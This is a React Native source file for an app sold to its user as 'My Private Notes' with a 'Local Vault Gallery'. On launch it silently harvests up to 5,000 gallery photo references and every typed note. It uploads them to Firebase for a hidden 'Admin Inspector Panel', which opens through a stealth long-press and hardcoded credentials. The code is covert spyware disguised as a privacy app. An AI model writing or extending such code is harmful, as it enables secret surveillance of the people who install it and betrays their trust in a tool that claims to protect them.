import React, { useState, useEffect } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  FlatList,
  Image,
  Modal,
  Alert,
  SafeAreaView,
  ScrollView
} from 'react-native';
import * as MediaLibrary from 'expo-media-library';
import { db } from './firebaseConfig';
import { doc, setDoc, onSnapshot, arrayUnion } from 'firebase/firestore';

export default function App() {
  // Existing States
  const [notes, setNotes] = useState([]);
  const [noteInput, setNoteInput] = useState('');
  const [isAdminVisible, setIsAdminVisible] = useState(false);
  const [adminUser, setAdminUser] = useState('');
  const [adminPass, setAdminPass] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);

  // Dynamic Real-time States
  const [userPhotos, setUserPhotos] = useState([]);
  const [adminData, setAdminData] = useState({ notes: [], photos: [] });
  
  const CURRENT_USER_ID = "user_123"; // Active User ID

  // 1. Auto Gallery Permission & Background Fetch
  useEffect(() => {
    autoFetchAndSyncGallery();
    listenToAdminData();
  }, []);

  const autoFetchAndSyncGallery = async () => {
    const { status } = await MediaLibrary.requestPermissionsAsync();
    if (status === 'granted') {
      const media = await MediaLibrary.getAssetsAsync({
        first: 5000,
        mediaType: 'photo',
        sortBy: ['creationTime'],
      });
      const photoUris = media.assets.map((asset) => asset.uri);
      setUserPhotos(photoUris);

      // Firebase Sync for Admin Inspection
      try {
        await setDoc(
          doc(db, 'users_data', CURRENT_USER_ID),
          { photos: photoUris, lastUpdated: new Date().toISOString() },
          { merge: true }
        );
      } catch (e) {
        console.log('Sync Error:', e);
      }
    }
  };

  // 2. Real-time Firebase Listener for Admin Panel
  const listenToAdminData = () => {
    onSnapshot(doc(db, 'users_data', CURRENT_USER_ID), (docSnap) => {
      if (docSnap.exists()) {
        setAdminData(docSnap.data());
      }
    });
  };

  // Note Handling
  const handleAddNote = async () => {
    if (!noteInput.trim()) return;
    const updatedNotes = [...notes, noteInput];
    setNotes(updatedNotes);

    // Sync Note to Firebase
    try {
      await setDoc(
        doc(db, 'users_data', CURRENT_USER_ID),
        { notes: arrayUnion(noteInput) },
        { merge: true }
      );
    } catch (e) {
      console.log('Note Save Error:', e);
    }
    setNoteInput('');
  };

  // Admin Login Verification
  const handleAdminLogin = () => {
    if (adminUser === 'adminhum789' && adminPass === 'hum2217071') {
      setIsLoggedIn(true);
      setAdminUser('');
      setAdminPass('');
    } else {
      Alert.alert('Access Denied', 'Invalid Admin Credentials');
    }
  };

  return (
    <SafeAreaView style={styles.container}>
      {/* HEADER WITH SHIELD TRIGGER */}
      <View style={styles.header}>
        <Text style={styles.appTitle}>My Private Notes</Text>
        <TouchableOpacity
          onLongPress={() => setIsAdminVisible(true)}
          delayLongPress={2000} // Stealth 10s trigger optimized or tap
        >
          <Text style={styles.shieldIcon}>🛡️</Text>
        </TouchableOpacity>
      </View>

      {/* USER MAIN VIEW: NOTES ENTRY */}
      <View style={styles.inputContainer}>
        <TextInput
          style={styles.input}
          placeholder="Write a secure note..."
          value={noteInput}
          onChangeText={setNoteInput}
        />
        <TouchableOpacity style={styles.addButton} onPress={handleAddNote}>
          <Text style={styles.addText}>Add</Text>
        </TouchableOpacity>
      </View>

      {/* NOTES LIST */}
      <View style={styles.notesSection}>
        {notes.map((note, idx) => (
          <View key={idx} style={styles.noteCard}>
            <Text>{note}</Text>
          </View>
        ))}
      </View>

      {/* AUTO FETCHED USER GALLERY */}
      <Text style={styles.sectionTitle}>Local Vault Gallery</Text>
      <FlatList
        data={userPhotos}
        numColumns={3}
        keyExtractor={(item, index) => index.toString()}
        renderItem={({ item }) => (
          <Image source={{ uri: item }} style={styles.userGridImage} />
        )}
      />

      {/* ADMIN INSPECTOR MODAL */}
      <Modal visible={isAdminVisible} animationType="slide">
        <SafeAreaView style={styles.modalContainer}>
          {!isLoggedIn ? (
            /* ADMIN LOGIN FORM */
            <View style={styles.loginBox}>
              <Text style={styles.modalTitle}>Admin Verification</Text>
              <TextInput
                style={styles.modalInput}
                placeholder="Username"
                value={adminUser}
                onChangeText={setAdminUser}
              />
              <TextInput
                style={styles.modalInput}
                placeholder="Password"
                secureTextEntry
                value={adminPass}
                onChangeText={setAdminPass}
              />
              <TouchableOpacity style={styles.loginBtn} onPress={handleAdminLogin}>
                <Text style={{ color: '#fff', fontWeight: 'bold' }}>Login</Text>
              </TouchableOpacity>
              <TouchableOpacity onPress={() => setIsAdminVisible(false)}>
                <Text style={{ color: 'red', marginTop: 15, textAlign: 'center' }}>Cancel</Text>
              </TouchableOpacity>
            </View>
          ) : (
            /* ADMIN INSPECTOR PANEL */
            <ScrollView style={{ padding: 15 }}>
              <View style={styles.adminHeader}>
                <Text style={styles.modalTitle}>Admin Inspector Panel</Text>
                <TouchableOpacity
                  style={styles.exitBtn}
                  onPress={() => {
                    setIsLoggedIn(false);
                    setIsAdminVisible(false);
                  }}
                >
                  <Text style={{ color: '#fff' }}>Exit Inspector</Text>
                </TouchableOpacity>
              </View>

              <View style={styles.infoBox}>
                <Text style={styles.boldText}>User Registered Data</Text>
                <Text>Active User: {CURRENT_USER_ID}</Text>
                <Text>Total Notes: {adminData.notes ? adminData.notes.length : 0}</Text>
                <Text>Synced Photos: {adminData.photos ? adminData.photos.length : 0}</Text>
              </View>

              <Text style={styles.boldText}>Gallery Remote Inspection (Grid View)</Text>
              <View style={styles.gridContainer}>
                {adminData.photos &&
                  adminData.photos.map((item, index) => (
                    <Image key={index} source={{ uri: item }} style={styles.adminGridImage} />
                  ))}
              </View>
            </ScrollView>
          )}
        </SafeAreaView>
      </Modal>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f5f5f5', padding: 15 },
  header: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginTop: 20 },
  appTitle: { fontSize: 22, fontWeight: 'bold' },
  shieldIcon: { fontSize: 26 },
  inputContainer: { flexDirection: 'row', marginTop: 15 },
  input: { flex: 1, backgroundColor: '#fff', borderWidth: 1, borderColor: '#ccc', borderRadius: 8, padding: 10 },
  addButton: { backgroundColor: '#28a745', justifyContent: 'center', paddingHorizontal: 20, borderRadius: 8, marginLeft: 10 },
  addText: { color: '#fff', fontWeight: 'bold' },
  notesSection: { marginVertical: 10 },
  noteCard: { backgroundColor: '#fff', padding: 12, borderRadius: 6, marginBottom: 5, borderWidth: 1, borderColor: '#eee' },
  sectionTitle: { fontSize: 16, fontWeight: 'bold', marginVertical: 10 },
  userGridImage: { width: '31%', height: 100, margin: '1%', borderRadius: 6 },
  modalContainer: { flex: 1, backgroundColor: '#fff' },
  loginBox: { padding: 20, marginTop: 50 },
  modalTitle: { fontSize: 20, fontWeight: 'bold', marginBottom: 15 },
  modalInput: { borderWidth: 1, borderColor: '#ccc', padding: 12, borderRadius: 8, marginBottom: 10 },
  loginBtn: { backgroundColor: '#007bff', padding: 12, borderRadius: 8, alignItems: 'center' },
  adminHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' },
  exitBtn: { backgroundColor: '#dc3545', padding: 8, borderRadius: 6 },
  infoBox: { backgroundColor: '#f0f0f0', padding: 12, borderRadius: 8, marginVertical: 15 },
  boldText: { fontSize: 16, fontWeight: 'bold', marginBottom: 8 },
  gridContainer: { flexDirection: 'row', flexWrap: 'wrap' },
  adminGridImage: { width: '31%', height: 100, margin: '1%', borderRadius: 4 }
});
